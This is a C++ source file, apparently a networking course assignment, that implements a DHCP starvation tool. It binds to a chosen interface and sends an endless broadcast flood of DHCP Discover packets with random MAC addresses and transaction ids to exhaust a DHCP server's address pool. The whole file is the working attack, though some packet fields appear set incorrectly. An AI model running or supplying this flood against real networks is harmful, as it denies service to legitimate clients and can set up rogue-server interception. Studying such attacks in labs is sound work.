
// C
#include <cstring>
#include <unistd.h>
// C++
#include <iostream>
// net
#include <arpa/inet.h>

// user
#include "ipk.h"

using namespace std;

/**
 * @brief Sends broadcast DHCP Discover packet.
 * @param sock      Socket to send DHCP Discover to.
 */
void send_DHCP_DISCOVER(int);


/**
 * @brief Main function.
 */
int main(int argc, char *argv[])
{
    // argument processing
    if(argc != 3 || string(argv[1]) != "-i")
    { cerr << "Usage: ./ipkdhcpstarve -i <interface>\n"; exit(ARG_ERR); }
    const char * ifce = argv[2];


    //  create socket
    Socket sock = Socket();
    if(!sock.opened()) { cerr << "socket() failed.\n"; exit(SOCK_ERR); }
    // sets debug
    if(!sock.set(SO_DEBUG))
    { cerr << "setsockopt(SO_DEBUG) failed.\n"; exit(SOCK_ERR); }
    // sets reuse address
    if(!sock.set(SO_REUSEADDR)) { cerr << "setsockopt(SO_REUSEADDR) failed.\n"; exit(SOCK_ERR); }
    // sets broadcast
    if(!sock.set(SO_BROADCAST)) { cerr << "setsockopt(SO_BROADCAST) failed.\n"; exit(SOCK_ERR); }
    // sets socket to device
    if(setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifce, strlen(ifce)) < 0) { cerr << "setsockopt(SO_BINDTODEVICE) failed.\n"; exit(SOCK_ERR); }
    srand(time(NULL));

    
    // DHCP Discover flood
    while(true) { send_DHCP_DISCOVER(sock); /*usleep(1000);*/ }
    return 0;
}


void send_DHCP_DISCOVER(int sock)
{
    DHCPPacket dhcp;
    
    /* --------- DHCP -------- */
    dhcp.op = DHCPDISCOVER; // msg type
    dhcp.xid = rand(); // transaction id
    dhcp.ciaddr = inet_addr("0.0.0.0"); // client ip
    dhcp.yiaddr = inet_addr("0.0.0.0"); // client ip
    dhcp.siaddr = inet_addr("0.0.0.0"); // ip of next server to talk to
    dhcp.giaddr = inet_addr("0.0.0.0"); // ip of dhcp relay agent
    dhcp.chaddr[0] = rand(); // random mac addr
    dhcp.chaddr[1] = rand();
    dhcp.chaddr[2] = rand();
    dhcp.chaddr[3] = rand();
    dhcp.opt[0] = 0x63; // magic cookie
    dhcp.opt[1] = 0x82;
    dhcp.opt[2] = 0x53;
    dhcp.opt[3] = 0x63;
    dhcp.opt[4] = 53;
    dhcp.opt[5] = 0x01;
    dhcp.opt[6] = 0x01;
    dhcp.opt[7] = 0xFF;
    /* ----------------------- */
    
    /* ----- address ----- */
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("255.255.255.255");
    addr.sin_port = htons(67);
    /* ------------------ */

    int b;
    if( (b = sendto(sock, &dhcp, sizeof(dhcp), 0, (struct sockaddr *)&addr, sizeof(addr))) < 0)
        { cerr << "sendto() failed.\n"; exit(SOCK_ERR); }
}